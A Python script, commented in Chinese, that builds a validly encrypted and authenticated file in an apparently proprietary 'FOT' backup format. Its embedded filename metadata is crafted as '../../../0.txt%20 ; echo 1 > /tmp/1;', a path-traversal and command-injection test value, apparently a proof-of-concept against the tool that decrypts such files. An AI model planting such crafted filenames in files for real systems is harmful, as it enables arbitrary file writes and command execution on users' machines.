#!/usr/bin/env python3
"""生成与已确认 FOT 文件格式兼容的单个测试加密文件。"""

from __future__ import annotations

import base64
import hashlib
import hmac
import os
import subprocess
import sys
from pathlib import Path

INPUT_FILE = Path("recovered_zero/0.txt")
PASSWORD = "0"
METADATA_FILENAME = "../../../0.txt%20 ; echo 1 > /tmp/1;"

FOT_MAGIC = bytes.fromhex("464f54a31c77005e")
FOT_VERSION = 1
FIXED_HEADER_LENGTH = 45
TAG_LENGTH = 16
USABILITY_PLAINTEXT = b"teirenfeiniuyunpanbeifencryptoencrypto"
KDF_PREFIX = bytes.fromhex("3ca15ef9d2076b")


class FOTError(ValueError):
    pass


def derive_key(password: bytes, salt: bytes, iterations: int) -> bytes:
    return hashlib.pbkdf2_hmac("sha256", password, KDF_PREFIX + salt, iterations, 32)


def aes_ctr_crypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    try:
        completed = subprocess.run(
            [
                "openssl",
                "enc",
                "-aes-256-ctr",
                "-nosalt",
                "-K",
                key.hex(),
                "-iv",
                iv.hex(),
            ],
            input=data,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
    except FileNotFoundError as error:
        raise FOTError("未找到 openssl；需要 OpenSSL 的 aes-256-ctr 支持") from error

    if completed.returncode != 0:
        message = completed.stderr.decode("utf-8", "replace").strip()
        raise FOTError(f"OpenSSL AES-CTR 处理失败：{message}")
    return completed.stdout


def require(condition: bool, message: str) -> None:
    if not condition:
        raise FOTError(message)


def format_int64_hex_padded(value: int) -> str:
    return format(value, "x").rjust(16, "0")


def generate_fot_name(input_name: str, size: int, mtime_unix_seconds: int) -> str:
    digest = hashlib.md5(input_name.encode("utf-8")).hexdigest()
    return (
        digest
        + format_int64_hex_padded(size)
        + format_int64_hex_padded(mtime_unix_seconds)
        + ".fot"
    )


def encode_metadata_entry(key: bytes, value: bytes) -> bytes:
    entry_length = 3 + len(key) + len(value)
    require(entry_length <= 0xFFFF, "元数据条目超过 FOT 的 uint16 长度范围")
    require(len(key) <= 0xFF, "元数据键超过 FOT 的 uint8 长度范围")
    return entry_length.to_bytes(2, "big") + bytes([len(key)]) + key + value


def build_fot(plaintext: bytes, password: bytes, metadata_filename: bytes) -> bytes:
    data_iv = os.urandom(16)
    salt = os.urandom(9)
    padding = os.urandom(1)
    usability_iv = os.urandom(16)

    usability_key = derive_key(password, salt, 100)
    usability_ciphertext = aes_ctr_crypt(usability_key, usability_iv, USABILITY_PLAINTEXT)
    usability_value = base64.b64encode(usability_iv + usability_ciphertext)

    filename_key = derive_key(password, salt, 1000)
    filename_ciphertext = aes_ctr_crypt(filename_key, data_iv, metadata_filename)
    filename_tag = hmac.new(filename_key, filename_ciphertext, hashlib.sha256).digest()[:TAG_LENGTH]
    filename_value = base64.b64encode(filename_ciphertext + filename_tag)

    body_key = derive_key(password, salt, 10000)
    body_ciphertext = aes_ctr_crypt(body_key, data_iv, plaintext)
    body_tag = hmac.new(body_key, body_ciphertext, hashlib.sha256).digest()[:TAG_LENGTH]

    metadata = (
        encode_metadata_entry(b"usability", usability_value)
        + encode_metadata_entry(b"filename", filename_value)
    )
    header_length = FIXED_HEADER_LENGTH + len(metadata)
    total_length = header_length + len(body_ciphertext) + TAG_LENGTH
    require(header_length <= 0xFFFF, "FOT header_len 超过 uint16 长度范围")
    require(total_length <= 0xFFFFFFFFFFFFFFFF, "FOT total_len 超过 uint64 长度范围")

    fixed_header = (
        FOT_MAGIC
        + bytes([FOT_VERSION])
        + header_length.to_bytes(2, "big")
        + total_length.to_bytes(8, "big")
        + data_iv
        + salt
        + padding
    )
    return fixed_header + metadata + body_ciphertext + body_tag


def parse_metadata(blob: bytes, header_length: int) -> dict[bytes, bytes]:
    metadata: dict[bytes, bytes] = {}
    offset = FIXED_HEADER_LENGTH
    while offset < header_length:
        require(offset + 3 <= header_length, "生成结果的元数据条目头被截断")
        entry_length = int.from_bytes(blob[offset : offset + 2], "big")
        key_length = blob[offset + 2]
        entry_end = offset + entry_length
        key_end = offset + 3 + key_length
        require(entry_length >= key_length + 3, "生成结果的元数据 entry_len 非法")
        require(entry_end <= header_length and key_end <= entry_end, "生成结果的元数据越界")
        key = blob[offset + 3 : key_end]
        require(key not in metadata, "生成结果出现重复元数据键")
        metadata[key] = blob[key_end:entry_end]
        offset = entry_end
    require(offset == header_length, "生成结果的元数据未结束于 header_len")
    return metadata


def validate_generated_fot(blob: bytes, plaintext: bytes, password: bytes, metadata_filename: bytes) -> int:
    require(blob[:8] == FOT_MAGIC, "生成结果的 FOT 魔数不匹配")
    require(blob[8] == FOT_VERSION, "生成结果的 FOT 版本不匹配")

    header_length = int.from_bytes(blob[9:11], "big")
    total_length = int.from_bytes(blob[11:19], "big")
    require(header_length >= FIXED_HEADER_LENGTH, "生成结果的 header_len 小于固定头长度")
    require(total_length == len(blob), "生成结果的 total_len 与文件长度不一致")
    require(header_length <= total_length - TAG_LENGTH, "生成结果的 header_len 越过正文认证标签")

    data_iv = blob[19:35]
    salt = blob[35:44]
    metadata = parse_metadata(blob, header_length)
    require(set(metadata) == {b"usability", b"filename"}, "生成结果的元数据键不匹配")

    usability = base64.b64decode(metadata[b"usability"], validate=True)
    require(len(usability) == 16 + len(USABILITY_PLAINTEXT), "生成结果的 usability 长度不匹配")
    usability_plaintext = aes_ctr_crypt(
        derive_key(password, salt, 100), usability[:16], usability[16:]
    )
    require(
        hmac.compare_digest(usability_plaintext, USABILITY_PLAINTEXT),
        "生成结果的 usability 校验失败",
    )

    packed_filename = base64.b64decode(metadata[b"filename"], validate=True)
    require(len(packed_filename) >= TAG_LENGTH, "生成结果的 filename 缺少认证标签")
    filename_ciphertext, filename_tag = packed_filename[:-TAG_LENGTH], packed_filename[-TAG_LENGTH:]
    filename_key = derive_key(password, salt, 1000)
    expected_filename_tag = hmac.new(filename_key, filename_ciphertext, hashlib.sha256).digest()[:TAG_LENGTH]
    require(
        hmac.compare_digest(filename_tag, expected_filename_tag),
        "生成结果的 filename HMAC 校验失败",
    )
    require(
        aes_ctr_crypt(filename_key, data_iv, filename_ciphertext) == metadata_filename,
        "生成结果的 filename AES-CTR 校验失败",
    )

    body_ciphertext = blob[header_length:-TAG_LENGTH]
    body_tag = blob[-TAG_LENGTH:]
    body_key = derive_key(password, salt, 10000)
    expected_body_tag = hmac.new(body_key, body_ciphertext, hashlib.sha256).digest()[:TAG_LENGTH]
    require(
        hmac.compare_digest(body_tag, expected_body_tag),
        "生成结果的正文 HMAC 校验失败",
    )
    require(
        aes_ctr_crypt(body_key, data_iv, body_ciphertext) == plaintext,
        "生成结果的正文 AES-CTR 校验失败",
    )
    return header_length


def main() -> int:
    try:
        plaintext = INPUT_FILE.read_bytes()
        source_stat = INPUT_FILE.stat()
        password = PASSWORD.encode("utf-8")
        metadata_filename = METADATA_FILENAME.encode("utf-8")

        output_name = generate_fot_name(
            INPUT_FILE.name,
            source_stat.st_size,
            int(source_stat.st_mtime),
        )
        output_path = INPUT_FILE.with_name(output_name)
        require(not output_path.exists(), f"拒绝覆盖已有 FOT 文件：{output_path}")

        fot_blob = build_fot(plaintext, password, metadata_filename)
        header_length = validate_generated_fot(fot_blob, plaintext, password, metadata_filename)
        output_path.write_bytes(fot_blob)

        print(f"已生成 FOT 文件：{output_path}")
        print(f"输入明文长度：{len(plaintext)}")
        print(f"FOT 头长度：{header_length}")
        print(f"metadata filename：{METADATA_FILENAME}")
        return 0
    except (OSError, FOTError, ValueError) as error:
        print(f"生成失败：{error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
